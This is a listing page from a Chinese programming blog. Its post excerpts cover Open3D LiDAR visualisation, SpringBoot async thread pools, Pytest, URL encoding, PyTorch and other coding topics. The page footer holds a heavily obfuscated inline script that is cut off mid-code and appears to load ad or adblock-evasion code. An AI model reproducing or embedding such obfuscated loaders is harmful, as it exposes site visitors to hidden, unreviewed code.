cache:http://kjj.yueyang.gov.cn/20468/content_1989798.html 限定关键词 "关键词" 限定标题intitle intitle:标题名 限定标题+限定关键词 限定标题多个关键词 限定内容关键词 限定文章内包含的关键词
限定内容包含多个关键词
要求标题里必须包含关键字，文章内容中必须含有关键字
限定搜索结果的网址 限定网址来源–站内搜索 限定搜索结果的网站来源
限定图片尺寸 elon musk imagesize:5760x3840 限定文件格式 产品经理导航网址 设计师导航网址
新媒体导航网址
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/764056102a303ab17b2dffbe6adbd9dd/" rel="bookmark">
			使用Open3D实现3D激光雷达可视化：以自动驾驶的2DKITTI深度框架为例（下篇）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		原创 | 文 BFT机器人 【原文链接】使用Open3D实现3D激光雷达可视化：以自动驾驶的2DKITTI深度框架为例（上篇）
05
Open3D可视化工具
多功能且高效的3D数据处理：Open3D是一个全面的开源库，为3D数据处理提供强大的解决方案。它具有优化的后端架构，可实现高效的并行化，非常适合处理复杂的3D几何形状和算法；
逼真的3D场景建模和分析：该库提供了用于场景重建和曲面对齐的专用工具，这些工具是创建精确3D模型的基础。它实现了基于物理的渲染（PBR），确保了这些3D场景的可视化不仅精确，而且非常逼真，大大增强了用户体验和工具在各种专业场景中的适用性；
跨平台兼容性：它支持GCC5.X、XCode10+和VisualStudio2019等各种编译器，确保在Linux、OSX和Windows上无缝运行。它通过conda和pip提供简单的安装过程，方便用户快速轻松地进行设置。
Open3D库的特性和功能
Open3D从头开始开发，专注于精简和有目的的依赖项选择，使其成为3D数据处理中轻量级但功能强大的工具。它的跨平台兼容性是一个关键功能，允许以最小的努力在各种操作系统上进行简单的设置和编译。其代码库的特点是简洁、一致的样式和透明的代码审查过程，反映了其对高质量软件工程实践的承诺。
Open3D结合了基于物理的渲染（PBR），将3D场景可视化的真实感提升到了一个新的水平，从而增加了可视化的真实感。其全面的3D可视化功能允许对3D数据进行交互式探索，从而增强用户的参与度和理解力。此外，它还包括Python绑定，为脚本编写和快速原型设计提供了用户友好且功能强大的界面，使其成为该领域新手和经验丰富的从业者的理想选择。
该库的实用性和有效性体现在它在众多已发表的研究项目中的使用以及在基于云的应用程序中的积极部署。Open3D鼓励并欢迎全球开源社区的贡献，营造协作和创新的开发环境。这使得Open3D不仅仅是一个用于3D数据处理的工具，更是一个在3D数据分析和可视化领域协同创新的平台。
06
3D点云可视化：代码演练
在本节中，我们将探讨可视化KITTI3DLiDAR传感器扫描数据集所涉及的各种过程，并生成其3D点云表示。您可以通过单击“下载代码”按钮来下载本文中的代码。
加载和读取2D深度图像
此代码片段定义了一个函数“load_depth_image”，该函数用于读取和处理2D深度图像。
#Readthe2DDepthImage
defload_depth_image(file_path):
#Loadthedepthimage
depth_image=plt.imread(file_path)
depth_image_scaling_factor=250.0
#Assumingthedepthimageisnormalized,wemayneedtoscaleittotheactualdistancevalues
#Thisscalingfactorisdataset-specific;you'llneedtoadjustitbasedontheKITTIdatasetdocumentation
depth_image*=depth_image_scaling_factor
returndepth_image
处理多个2D深度帧
此代码片段定义了一个函数“load_and_process_frames”，该函数旨在处理来自指定目录的一系列2D深度图像文件，将它们转换为点云数据。
defload_and_process_frames(directory):
point_clouds=[]
forfilenameinsorted(os.listdir(directory)):
iffilename.endswith('.png'):#CheckforPNGimages
file_path=os.path.join(directory,filename)
depth_image=load_depth_image(file_path)
point_cloud=depth_image_to_point_cloud(depth_image)
point_clouds.append(point_cloud)
returnpoint_clouds
将2D深度帧转换为3DLiDAR点云
“depth_image_to_point_cloud”功能旨在将2D深度图像转换为3D点云。
defdepth_image_to_point_cloud(depth_image,h_fov=(-90,90),v_fov=(-24.9,2.0),d_range=(0,100)):
#Adjustinganglesforbroadcasting
h_angles=np.deg2rad(np.linspace(h_fov[0],h_fov[1],depth_image.shape[1]))
v_angles=np.deg2rad(np.linspace(v_fov[0],v_fov[1],depth_image.shape[0]))
#Reshapinganglesforbroadcasting
h_angles=h_angles[np.newaxis,:]#Shapebecomes(1,1440)
v_angles=v_angles[:,np.newaxis]#Shapebecomes(64,1)
#Calculatex,y,andz
x=depth_image*np.sin(h_angles)*np.cos(v_angles)
y=depth_image*np.cos(h_angles)*np.cos(v_angles)
z=depth_image*np.sin(v_angles)
#Filteroutpointsbeyondthedistancerange
valid_indices=(depth_image&gt;=d_range[0])&amp;(depth_image&lt;=d_range[1])
#Applythemasktoeachcoordinatearray
x=x[valid_indices]
y=y[valid_indices]
z=z[valid_indices]
#Stacktogetthepointcloud
point_cloud=np.stack((x,y,z),axis=-1)
returnpoint_cloud
模拟点云表示
“animate_point_clouds”函数是一个Python例程，旨在使用Open3D库对一系列3D点云进行动画处理。
defanimate_point_clouds(point_clouds):
vis=o3d.visualization.Visualizer()
vis.create_window()
#Setbackgroundcolortoblack
vis.get_render_option().background_color=np.array([0,0,0])
#Initializepointcloudgeometry
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/764056102a303ab17b2dffbe6adbd9dd/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/1bd10e5533839a045366aee9ffbb157b/" rel="bookmark">
			SpringBoot 异步编程浅谈
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		1. 需求背景 当我们需要提高系统的并发性能时，我们可以将耗时的操作异步执行，从而避免线程阻塞，提高系统的并发性能。例如，在处理大量的并发请求时，如果每个请求都是同步阻塞的方式处理，系统的响应时间会变得很长。而使用异步编程，可以将一些耗时的操作交给其他线程去处理，从而释放主线程，提高系统的并发能力。
2. SpringBoot如何实现异步调用 从Spring 3开始，可以通过在方法上标注@Async注解来实现异步方法调用。这意味着当我们调用被@Async注解修饰的方法时，它会在后台以异步方式执行。为了启用异步功能，我们需要一个配置类，并在该类上使用@EnableAsync注解。这个注解告诉Spring要开启异步功能。
3. 异步调用实现步骤 第一步：新建配置类，开启@Async功能支持 使用@EnableAsync来开启异步任务支持，@EnableAsync注解可以直接放在SpringBoot启动类上，也可以单独放在其他配置类上。这里选择使用单独的配置类SyncConfiguration。
使用@Async注解，在默认情况下用的是SimpleAsyncTaskExecutor线程池，该线程池不是真正意义上的线程池。
使用此线程池无法实现线程重用，每次调用都会新建一条线程。若系统中不断的创建线程，最终会导致系统占用内存过高，引发OutOfMemoryError错误，所以在使用Spring中的@Async异步框架时要自定义线程池，替代默认的SimpleAsyncTaskExecutor，这也是自定义配置的意义之一。
@Configuration @EnableAsync public class SyncConfiguration { @Bean(name = "asyncPoolTaskExecutor") public ThreadPoolTaskExecutor executor() { ThreadPoolTaskExecutor taskExecutor = new ThreadPoolTaskExecutor(); //核心线程数，设置核心线程数。核心线程数是线程池中一直保持活动的线程数量，即使它们是空闲的。 taskExecutor.setCorePoolSize(10); //设置线程池维护线程的最大数量。当缓冲队列已满并且核心线程数的线程都在忙碌时，线程池会创建新的线程，直到达到最大线程数。 taskExecutor.setMaxPoolSize(100); //设置缓冲队列的容量。当所有的核心线程都在忙碌时，新的任务将会被放入缓冲队列中等待执行。 taskExecutor.setQueueCapacity(50); //设置非核心线程的空闲时间。当超过核心线程数的线程在空闲时间达到设定值后，它们将被销毁，以减少资源的消耗。 taskExecutor.setKeepAliveSeconds(200); //异步方法内部线程名称 taskExecutor.setThreadNamePrefix("async-"); /** * 当线程池的任务缓存队列已满并且线程池中的线程数目达到maximumPoolSize，如果还有任务到来就会采取任务拒绝策略 * 通常有以下四种策略： * ThreadPoolExecutor.AbortPolicy:丢弃任务并抛出RejectedExecutionException异常。 * ThreadPoolExecutor.DiscardPolicy：也是丢弃任务，但是不抛出异常。 * ThreadPoolExecutor.DiscardOldestPolicy：丢弃队列最前面的任务，然后重新尝试执行任务（重复此过程） * ThreadPoolExecutor.CallerRunsPolicy：重试添加当前的任务，自动重复调用 execute() 方法，直到成功 */ taskExecutor.setRejectedExecutionHandler(new ThreadPoolExecutor.CallerRunsPolicy()); taskExecutor.initialize(); return taskExecutor; } } 注： Spring提供了多种线程池：
SimpleAsyncTaskExecutor：不是真的线程池，这个类不重用线程，每次调用都会创建一个新的线程。
SyncTaskExecutor：这个类没有实现异步调用，只是一个同步操作。只适用于不需要多线程的地
ConcurrentTaskExecutor：Executor的适配类，不推荐使用。如果ThreadPoolTaskExecutor不满足要求时，才用考虑使用这个类
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/1bd10e5533839a045366aee9ffbb157b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/75d3d388f5b4d17a8b67d5618a3f4ad4/" rel="bookmark">
			【DWJ_1703225514】基于Sklearn航空公司服务质量分析
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		【Talk is cheap】
# 导入库 import warnings warnings.filterwarnings('ignore') import pandas as pd import seaborn as sns import matplotlib.pyplot as plt plt.rcParams['font.sans-serif'] = ['SimHei'] plt.rcParams['axes.unicode_minus'] = False %matplotlib inline from sklearn.model_selection import train_test_split from sklearn.ensemble import RandomForestClassifier from sklearn.metrics import classification_report 1 加载数据
数据集中缺失数据占的百分比为: Unnamed: 0 0.000000 id 0.000000 Gender 0.000000 Customer Type 0.000000 Age 0.000000 Type of Travel 0.000000 Class 0.000000 Flight Distance 0.000000 Inflight wifi service 0.000000 Departure/Arrival time convenient 0.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/75d3d388f5b4d17a8b67d5618a3f4ad4/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/24b282dbe08a1e88815ca74cf3f633ea/" rel="bookmark">
			设计测试用例（万能思路 &#43; 六种设计用例方法）（详细 &#43; 图解 &#43; 实例）
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		一、设计测试用例的万能思路 针对某个物品/功能进行测试。
万能思路：功能测设 + 界面测试 + 性能测试 + 兼容性测试 + 易用性测试 + 安全测试。
总结：
功能测试：
水杯：装水、喝水...
注册场景：注册 + 登录
想象日常使用中的注册场景有哪些功能。
界面测试：
非软件：颜色、形状、大小、材质、整体
软件：
文字/输入框/图片/下拉框 ——&gt; 颜色、大小、形状、布局都要进行测试；
文字是否存在错别字、病句、折叠、重叠...
性能测试：
水杯：耐热性、耐寒性、耐摔性、抗压性...
软件：
响应时间
几千万人同时访问...
兼容性测试：
水杯：水杯可以装液体，针对不同液体。
软件：
系统：Linux、Windows、Mac；
终端：PC、移动端
浏览器：Chrome、FireFox、Safari...
易用性测试：
需要具备便捷、简单易上手的属性，用户引导、符合用户使用习惯。
安全测试：
水杯：
水杯的材质是否安全；
特殊情况下（高温低温）材质是否会释放毒性；
存放特殊的液体会不会导致化学反应，材质是否会释放毒性；
软件：
SQL注入
XSS漏洞
越权（垂直越权、水平越权）
现在我也找了很多测试的朋友，做了一个分享技术的交流群，共享了很多我们收集的技术文档和视频教程。 如果你不想再体验自学时找不到资源，没人解答问题，坚持几天便放弃的感受 可以加入我们一起交流。而且还有很多在自动化，性能，安全，测试开发等等方面有一定建树的技术大牛 分享他们的经验，还会分享很多直播讲座和技术沙龙 可以免费学习！划重点！开源的！！！ qq群号：1150305204【暗号：csdn999】 二、设计用例的方法 针对手撕代码、明确额需求、项目来设计测试用例。
1. 等价类
等价类是分块/分区的概念。将需求的输入划分若干个等价类，从等价类中选出一个测试用例，如果这个测试用例通过，则认为这整个等价类就通过。
通过等价类可以用较少的测试用例就可以尽可能多的覆盖功能，可以解决穷举法解决不了的问题。
有效等价类：针对需求文档是合理的、有意义的集合。
无效等价类：针对需求文档是没有意义的集合。
使用步骤：
1. 确定有效等价类和无效等价类；
2. 编写测试用例。
假设需求：姓名输入6~200位的字符
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/24b282dbe08a1e88815ca74cf3f633ea/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/22d8f416da02dc6c869cd22c95aad454/" rel="bookmark">
			5G LAN工业路由器：开启智能制造时代的关键
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		5G LAN通过5G技术，将终端进行分组与建群的方式组成一个LAN网络。5G LAN不仅具有原有的蜂窝网络LAN资源共享、快速布网、安全防护等优势，还进一步增加了二层通信、广播、多播等新的应用功能，提高了LAN在工业互联网、智能建筑等场景下的渗透率。
计讯物联5G LAN工业路由器以其高速、低延迟的特点成为了实现工业互联网的关键设备。它不仅可以支持大规模的设备连接，还能通过高速的数据传输和高效的通信协议实现实时的数据获取和处理。无论是生产线上的机器设备，还是工厂之间的远程控制和监测，都离不开5G LAN工业路由器的支持。
与传统的有线网络相比，5G LAN工业路由器不仅速度更快，而且在数据传输的稳定性上也有着明显的优势。这对于工业制造过程中对数据实时性和准5G LAN工业路由器的另一个特点是其强大的安全防护能力。在工业互联网环境中，安全问题一直是一个重要的考虑因素。5G LAN工业路由器支持VPN加密、国密软硬件加密和防火墙功能，可以有效防止黑客入侵、未经授权的访问和数据泄漏等安全风险。这一点对于工业领域来说尤为重要，因为工业设备的运行和生产数据的保护至关重要。
此外，5G LAN工业路由器还具备可靠的网络管理和远程监控功能。通过连接到云平台，企业可以实时监测和管理各个设备的工作状态、数据流量和网络连接等信息。这可以帮助企业及时发现和解决问题，提高生产效率和运营效益。
在工业领域的应用方面，5G LAN工业路由器发挥着重要的作用。它可以应用于智能工厂、智能物流、智能交通等领域，帮助企业实现设备之间的互联互通、数据的高效传输和实时监控。同时，在工业物联网和人工智能的发展下，5G LAN工业路由器还能支持工厂自动化、机器学习和智能决策等更高级的功能。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/2ccf8780ead0aefe8df3be77192945ed/" rel="bookmark">
			小程序分享携带参数，被覆盖问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		场景： 子组件中写了‘onShareAppMessage’和‘onShareTimeLine’，父组件中也写了这两个函数，并且在url中携带了参数，发现分享后在分享页‘onLoad’中取不到参数。
// 分享目标页 onLoad(async (props: any) =&gt; { const { shareCode } = props; shareCode &amp;&amp; (parentId = Number(shareCode)) Loading('全力加载中...') }); // 触发分享页 onShareAppMessage(() =&gt; { return { title: '一起来组队，瓜分圣诞大奖！', path: '/pages/christmasActivity/index?shareCode=' + TeamData.dd_id, imageUrl: christmasShareicon, }; }); 原因： 子组件的这两个函数覆盖了父组件的，所以失效了。
原理： 小程序是单页面应用，可以说所有的页面都是层层嵌套的。当触发分享功能后，现在当前页面内查找这两个函数，如果没找到会向父级页面查找，一直查找到顶级为止，查找到就使用。如果当前页面有使用子组件且子组件内部也写了这两个函数，那么子覆盖父。
是不是有点像原型链。
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/5763e77ac34e2bb89b9a2975e59e101b/" rel="bookmark">
			Chart 11 OpenCL案例
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		文章目录 前言cv::Mat 乘以标量总结 前言 这是 opencl 的最后一章了，没什么特别的，写了一个 cv::Mat 乘以一个标量，基于 buf 和 image 两种方法实现。
cv::Mat 乘以标量 代码中引入了 cl.h 这个头文件，可以下载对应的库，或者直接把头文件拿过来用，头文件我就不提供了，可以去 github 上找找，函数没什么特别的，注意创建 buffer 对象和 image 对象时，注册对应的核函数。
整体而言opencl 的整个启动比较复杂繁琐。
#include &lt;iostream&gt; #include &lt;cassert&gt; #include &lt;CL/cl.h&gt; #include "opencv2/core.hpp" #include "opencv2/opencv.hpp" #include "opencv2/imgproc.hpp" #define CHECK_OPENCL_ERROR(call) \ do { \ cl_int err = call; \ if (err != CL_SUCCESS) { \ std::cerr &lt;&lt; "OpenCL error at " &lt;&lt; __FILE__ &lt;&lt; ":" &lt;&lt; __LINE__ &lt;&lt; " - Code: "
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/5763e77ac34e2bb89b9a2975e59e101b/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/e14e5a78bcf33bfb666b9d38c7745e32/" rel="bookmark">
			史上最细，Pytest自动化测试框架全面解析，看这篇就够了...
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		目录：导读 前言一、Python编程入门到精通二、接口自动化项目实战三、Web自动化项目实战四、App自动化项目实战五、一线大厂简历六、测试开发DevOps体系七、常用自动化测试工具八、JMeter性能测试九、总结（尾部小惊喜） 前言 1、pytest核心基本功能
非常容易上手，入门简单，具有丰富的资料文档，有很多实例可以进行参考
具有很多的第三方插件，并且可以自定义扩展功能
执行测试用例过程中可以将某些用例进行标记：跳过，指定顺序执行，标记失败，标记参数化等
支持标记参数化：用例脚本只需要编写一次，那么可以实现数据驱动测试完整整个模块的测试内容
支持重复执行失败用例
便捷管理用例，方便和持续集成工作完成集成任务，便于生成自动化测试报告
自动化测试框架的核心作用：
定位测试用例；
执行测试用例；
断言测试用例；
生成测试报告；
2、pytest常用的插件安装
测试框架
pytest 生成html测试报告
pytest-html 多线程运行
pytest-xdist 控制用例的执行顺序
pytest-ordering 失败用例重跑
pytest-rerunfailures 生成allure测试报告
allure-pytest 管理基础路径
pytest-base-url 如果需要单独安装插件内容可以使用命令：
pip install pytest …
集体插件安装，把所有需要安装的插件放置requirements.txt
pytest pytest-html pytest-xdist pytest-ordering pytest-rerunfailures allure-pytest pytest-base-url pip install -r requirements.txt 3、pytest用例执行规则
通过情况下项目中所有的用例会集成进行管理
创建testcases包
默认执行规则：
包名，以及模块名，用例名（函数，方法）符合以test开头或者test结尾
如果用例以方法的形式定义，那么类必须是以Test开头，而且不能有init构造方法
4、pytest用例执行方式
第一种执行方式：终端交互式执行
pytest：会执行所有符合默认规则的用例
pytest 执行用例的参数配置：
-s:会显示输出内容
-v:会显示用例的详细内容
-k：指定以什么开头用例执行
第二种执行方式：创建主函数执行
import pytest if __name__ == '__main__': pytest.main() 5、pytest标记跳过用例
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/e14e5a78bcf33bfb666b9d38c7745e32/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/cd993a531f9e7536eb50cdf9e0b6f6f6/" rel="bookmark">
			js对url进行编码解码的三种方式总结
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		js对url进行编码解码的三种方式总结_javascript技巧_脚本之家
为一个字符串进行URL编码很容易,只需要调用encodeURI,传入要编码的字符串即可,而且实现的方法不止这一个,下面这篇文章主要给大家介绍了关于js对url进行编码解码的三种方式,需要的朋友可以参考下
−
目录 第一种：escape 和 unescape第二种：encodeURI 和 decodeURI第三种：encodeURIComponent 和 decodeURIComponent总结 方法说明返回值escape(String)使用转义序列替换某些字符来对字符串进行编码，除了ASCII字母、数字、标点符号"@ * _ + - . /"以外返回Unicode编码字符串unescape(String)对使用 escape() 编码的字符串进行解码encodeURI(String)通过转义某些字符对 URI 进行编码，除了常见的符号以外（ASCII 字符），对其他一些在网址中有特殊含义的符号"; / ? : @ &amp; = + $ , #"，也不进行编码输出utf-8形式字符串decodeURI(String)对使用 encodeURI() 方法编码的字符串进行解码encodeURIComponent(String)通过某些转义字符对 URI 进行编码，会编译所有（包含特殊字符），ASCII 字符不编码，可以将参数中的中文、特殊字符进行转义输出utf-8形式字符串deencodeURIComponent(String)对使用 encodeURIComponent() 方法编码的字符串进行解码 第一种：escape 和 unescape escape()不能直接用于URL编码，它的真正作用是返回一个字符的Unicode编码值
它的具体规则是，除了ASCII字母、数字、标点符号"@ * _ + - . /"以外，对其他所有字符进行编码。在u0000到u00ff之间的符号被转成%xx的形式，其余符号被转成%uxxxx的形式。对应的解码函数是unescape()。
还有两个点需要注意：
首先，无论网页的原始编码是什么，一旦被Javascript编码，就都变为unicode字符。也就是说，Javascipt函数的输入和输出，默认都是Unicode字符。这一点对下面两个函数也适用。其次，escape()不对 "+" 编码。但是我们知道，网页在提交表单的时候，如果有空格，则会被转化为+字符。服务器处理数据的时候，会把+号处理成空格。所以，使用的时候要小心。 1
2
3
4
5
6
7
escape()编码：
const time = 2022-01-09
const tile = '63元黑糖颗粒固饮'
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/cd993a531f9e7536eb50cdf9e0b6f6f6/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/41af2263ab08ace053e103aa5aef1f7d/" rel="bookmark">
			【git】多次commit合并为一次commit
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ce687d0454442d17eeec3363c9bc64e6/" rel="bookmark">
			语音大模型资料
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		The workflow for facilitating interactions between LLMs and external entities using the Prompting Framework 大模型应用开发资料: 语音、检索、生成、视觉、微调、训练、推理、部署...... - Gitee.com
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/b1a19f969c9a4f1324d76a997a5d7c77/" rel="bookmark">
			刘二大人《PyTorch深度学习实践》p6逻辑斯蒂回归
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		刘二大人《PyTorch深度学习实践》p6 logistic回归 一、零碎知识点1.torchvision2.np.linspace3.torch.Tensor(x).view4.matplotlib画一条直线 二、分类问题1.二分类问题2.BCELoss函数3.思路流程 三、课程代码 一、零碎知识点 1.torchvision TorchVision提供了一些方便的函数和类，用于加载和预处理常见的图像数据集，如MNIST、CIFAR10、ImageNet等。它可以自动进行图像数据的下载、数据的分割和转换，以及数据集的加载和批处理。
MNIST：手写数据集。主要用于手写数字识别图像分类的任务，包括将图像分类为0到9中的一个数字。
import torchvision train_set = torchvision.datasets.MNIST(root='../dataset/mnist',train=True,download=True) test_set = torchvision.datasets.MNIST(root='../dataset/mnist',train=False,download=True) train=True/False表示是需要训练集还是测试集 CIFAR10：CIFAR10数据集包含了一组彩色图像，分为十个类别，每个类别有6000个图像，主要用于图像分类任务，要求将图像分类为飞机、汽车、鸟类、猫、鹿、狗、青蛙、马、船和卡车这十个类别之一。
2.np.linspace np.linspace是Numpy库中的一个函数，用于在指定的间隔内生成均匀分布的数值。
import numpy as np x=np.linspace(5,100,20) # 在5到100之间生成20个均匀分布的数值 print(x) #output:[ 5. 10. 15. 20. 25. 30. 35. 40. 45. 50. 55. 60. 65. 70. # 75. 80. 85. 90. 95. 100.] 3.torch.Tensor(x).view torch.Tensor(x).view()是将张量进行形状变换的操作，相当于numpy里面的reshape。
import torch x = torch.tensor([[1, 2, 3], [4, 5, 6]]) # 创建一个2x3的张量 y = x.view(3, 2) # 将x进行形状变换，得到一个3x2的新张量 print(x) print(y) output:
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/b1a19f969c9a4f1324d76a997a5d7c77/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/bb4505f56b5b86520191b151084357a8/" rel="bookmark">
			187. LCR 破冰游戏
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		LCR 187. 破冰游戏 题目： 社团共有 num 为成员参与破冰游戏，编号为 0 ~ num-1。成员们按照编号顺序围绕圆桌而坐。社长抽取一个数字 target，从 0 号成员起开始计数，排在第 target 位的成员离开圆桌，且成员离开后从下一个成员开始计数。请返回游戏结束时最后一位成员的编号。
示例： 示例 1：
输入：num = 7, target = 4 输出：1 示例 2：
输入：num = 12, target = 5 输出：0 提示：
1 &lt;= num &lt;= 10^51 &lt;= target &lt;= 10^6 解题: 方法一：迭代法 这是一个经典的约瑟夫环问题。可以使用递归或迭代来解决。
思路：
这种解法使用迭代的方式模拟约瑟夫环的过程。假设删除的位置为 last，当前数组长度为 n。
初始时，我们设置 last = 0，表示从 0 号位置开始。然后，我们循环从 2 号位置（数组长度为2）到 n 号位置（数组长度为 n），更新 last 的位置。
具体的更新公式是 last = (last + m) % i，其中 i 表示当前的数组长度。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/bb4505f56b5b86520191b151084357a8/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/32/">«</a>
	<span class="pagination__item pagination__item--current">33/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/34/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X